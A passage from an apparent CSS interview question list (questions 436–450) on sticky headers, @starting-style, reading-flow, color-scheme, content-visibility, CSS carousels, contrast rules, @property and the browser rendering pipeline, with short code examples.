Use these instead of hacks, because they come with keyboard support and correct roles for free.

### 436: How do you build a sticky element that changes appearance when it gets stuck?

In Chromium you can use a scroll-state container query (see question 399). For all browsers:

```css
.header {
  position: sticky;
  top: -1px;
}
.header.is-stuck {
  box-shadow: 0 2px 8px rgb(0 0 0 / 15%);
}
```

```js
const header = document.querySelector(".header");
new IntersectionObserver(
  ([entry]) => header.classList.toggle("is-stuck", entry.intersectionRatio < 1),
  { threshold: [1] },
).observe(header);
```

The `top: -1px` trick makes the header go 1px outside the viewport when stuck, so the observer sees it as no longer fully visible.

### 437: How do `transition` and `@starting-style` handle elements added to the DOM?

When an element is first rendered (inserted, or changed from `display: none`), there's no "before" style, so transitions don't run. `@starting-style` gives the browser the values to transition **from** on that first style update.

```css
.list-item {
  opacity: 1;
  translate: 0 0;
  transition:
    opacity 250ms,
    translate 250ms;

  @starting-style {
    opacity: 0;
    translate: 0 8px;
  }
}
```

New items now fade in when JavaScript appends them, with no class toggling or `requestAnimationFrame` tricks. `@starting-style` only applies on that first style change. It's Baseline since 2024. For exit animations of removed elements you still need JavaScript (or a view transition), because a removed element is gone right away.

### 438: How do you stagger an animation over a list in CSS?

```css
/* modern (where supported) */
.list > li {
  animation: fade-up 400ms both;
  animation-delay: calc((sibling-index() - 1) * 60ms);
}

/* portable: index set in HTML or JS */
.list > li {
  animation: fade-up 400ms both;
  animation-delay: calc(var(--i, 0) * 60ms);
}
```

```html
<li style="--i: 0">...</li>
<li style="--i: 1">...</li>
```

Keep the total delay short (cap it for long lists, for example with `min()`), otherwise the last items feel slow. Turn it off for `prefers-reduced-motion`.

### 439: What are `:open`, `:popover-open` and `:modal`?

They are state pseudo-classes for elements that open and close:

- `:open`: matches `<details>`, `<dialog>`, `<select>` (when its picker is shown) and `<input>` pickers while open. It's newer and not in every browser yet. Use `[open]` as a fallback for details and dialog.
- `:popover-open`: matches a popover that is showing.
- `:modal`: matches a dialog opened with `showModal()` or an element in fullscreen. It's useful because a dialog opened with `show()` is also `[open]` but isn't modal.

```css
dialog:modal {
  box-shadow: 0 30px 80px rgb(0 0 0 / 40%);
}
details:is([open], :open) > summary {
  font-weight: bold;
}
```

### 440: What is the `reading-flow` property?

When you reorder items with grid placement, `order` or `flex-direction: row-reverse`, the visual order no longer matches the DOM order. Tab focus then jumps around. `reading-flow` tells the browser to follow the visual order for focus navigation and screen readers.

```css
.grid {
  display: grid;
  grid-auto-flow: dense;
  reading-flow: grid-rows;
}
.toolbar {
  display: flex;
  flex-direction: row-reverse;
  reading-flow: flex-visual;
}
```

It shipped in Chromium (137). The safest option is still to keep the DOM order and the visual order the same.

### 441: How does `color-scheme` affect elements and iframes?

- It tells the browser which schemes the page supports. Built-in UI like scrollbars, form controls, the default canvas background and `light-dark()` follow the chosen scheme.
- It inherits, so you can set it on a section to force light or dark inside it.
- A `<meta name="color-scheme" content="light dark">` tag in `<head>` lets the browser pick the right background color **before** CSS loads, which avoids a white flash in dark mode.
- An iframe whose `color-scheme` doesn't match its parent gets an opaque background (to keep text readable). If the embedded page doesn't declare a scheme, you can see a white box inside a dark page.

### 442: Why do layout bugs sometimes only appear after fonts load?

Before the web font loads, the browser lays out text with the fallback font. When the web font arrives, text gets wider or narrower and line heights may change. That can:

- Make a heading wrap to two lines and push content down (CLS).
- Make a button that fit its label overflow.
- Change `scrollHeight` or measured sizes that JavaScript read too early.

Fixes: adjust fallback metrics (`size-adjust`, `ascent-override`), avoid fixed widths around text, and measure in JS after `document.fonts.ready`. `font-display: optional` avoids the late change completely.

### 443: What's the difference between hiding content with `content-visibility: hidden` and `display: none`?

Both hide the content and remove it from the accessibility tree. The difference is what the browser keeps:

- `display: none`: the element generates no box at all. Its rendering state is thrown away, and showing it again needs full style and layout.
- `content-visibility: hidden`: the element's own box stays (it takes up space based on `contain-intrinsic-size`), and the browser can **keep the rendering state** of its contents. Showing it again is much faster.

This makes `content-visibility: hidden` useful for things like virtual tab panels or cached views that switch often.

### 444: How do you keep visual order and DOM order in sync in responsive layouts?

- Write the DOM in a logical reading order first. Then use grid areas to place things visually at each breakpoint, but avoid putting items in a visual order that conflicts with reading order.
- Avoid `order`, `row-reverse` and `dense` for meaningful content.
- If a sidebar must appear before the main content on desktop and after it on mobile, decide which order is correct for screen reader and keyboard users and keep that in the DOM.
- Test by tabbing through the page at each breakpoint.
- Where you can't avoid a mismatch, `reading-flow` (Chromium) can help, but don't depend on it yet.

### 445: How would you build a pure CSS carousel with good accessibility?

Scroll snap gives the motion. Newer Chromium features add controls:

```css
.carousel {
  display: grid;
  grid-auto-flow: column;
  grid-auto-columns: 85%;
  gap: 1rem;
  overflow-x: auto;
  scroll-snap-type: x mandatory;
  overscroll-behavior-x: contain;
}
.carousel > * {
  scroll-snap-align: center;
}

/* Chromium: generated arrow buttons and dots */
.carousel {
  scroll-marker-group: after;
}
.carousel::scroll-button(right) {
  content: "→" / "Next";
}
.carousel::scroll-button(left) {
  content: "←" / "Previous";
}
.carousel > *::scroll-marker {
  content: "";
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: gray;
}
.carousel > *::scroll-marker:target-current {
  background: black;
}
```

`::scroll-button()` and `::scroll-marker` are Chromium-only so far, so other browsers get the scroll-snap carousel without buttons. Keep each slide reachable by keyboard and give the region an accessible label (`role="region"` and `aria-label`).

### 446: How do you check color contrast, and what are the rules?

WCAG 2 contrast ratios:

- **4.5:1** for normal text.
- **3:1** for large text (about 24px, or 18.66px bold), and for UI parts like borders of inputs and focus indicators.

Check with DevTools (the color picker shows the ratio and the AA/AAA lines), axe or Lighthouse. Watch for:

- Text on images or gradients. Check the worst spot, or add an overlay.
- Placeholder text, which is often too light.
- Disabled states, which are exempt but should still be readable.
- Dark mode and hover states, which need checking separately.

The newer APCA method (proposed for WCAG 3) measures contrast better for dark mode and thin fonts, but WCAG 2 ratios are still what legal requirements use.

### 447: What should you know about CSS `transition` on custom properties?

Unregistered custom properties are strings, so a transition on them jumps at the end (or halfway) instead of animating. To transition one, register it with `@property` and a type:

```css
@property --progress {
  syntax: "<percentage>";
  inherits: false;
  initial-value: 0%;
}
.ring {
  background: conic-gradient(#4f46e5 var(--progress), #e5e7eb 0);
  transition: --progress 600ms ease-out;
}
.ring[data-value="75"] {
  --progress: 75%;
}
```

Then everything that uses the property animates, even things that can't be animated directly, like gradient stops.

### 448: How do you write CSS for very large DOMs (for example a spreadsheet or log viewer)?

- **Virtualize**: only render visible rows. This is the most important step, and it's done in JavaScript.
- **Contain**: `contain: strict` on the scroll container and `contain: content` on rows, so updates stay local.
- **Fixed sizes**: fixed row heights and `table-layout: fixed` or fixed grid tracks, so layout doesn't depend on content.
- **Simple selectors**: flat class selectors, and no `:has()` or `:nth-child` across thousands of rows.
- **Cheap updates**: change one row's class instead of a parent's state, and avoid changing inherited custom properties high in the tree.
- **`content-visibility: auto`** for long non-virtualized sections.

### 449: What happens from downloading a CSS file to pixels on screen?

1. The HTML parser finds `<link rel="stylesheet">` (or the preload scanner finds it early) and requests the file. Rendering is blocked until it arrives.
2. The bytes are decoded and **tokenized**, then **parsed** into rules, which are added to the CSSOM. Invalid parts are dropped.
3. The browser indexes the rules by key selector (id, class, tag) to make matching fast.
4. **Style calculation**: for each element, matching rules are found and the cascade picks the winners (origin, layers, specificity, order). Values are computed, and inherited values are passed down.
5. **Layout**: box sizes and positions are worked out using the formatting contexts (block, inline, flex, grid).
6. **Paint**: draw commands are recorded for each layer, in stacking order.
7. **Composite**: layers are rasterized (often on the GPU) and put together into the final frame.

Later changes run only the steps they need: style, then layout, then paint, then composite.

### 450: When should you not solve something with CSS?

CSS can do a lot now, but some things belong elsewhere:

- **State that matters to the app** (selected items, form data, auth state). Keep it in JavaScript or the server. A `:checked` hack that holds important state is easy to break.
- **Content and meaning**. Text in `::before` or `content` isn't part of the document, can't be copied, and may be missed by assistive tech.
- **Accessibility semantics**. CSS can't make a `div` act like a button. Use the right HTML element or ARIA.
- **Complex interaction logic**, like drag and drop, keyboard shortcuts or focus trapping. CSS can style it, JavaScript should run it.
- **Security**. Hiding something with CSS doesn't protect it. It's still in the HTML.

A good rule is to use the right layer: HTML for structure and meaning, CSS for presentation and simple visual states, and JavaScript for behavior and data.
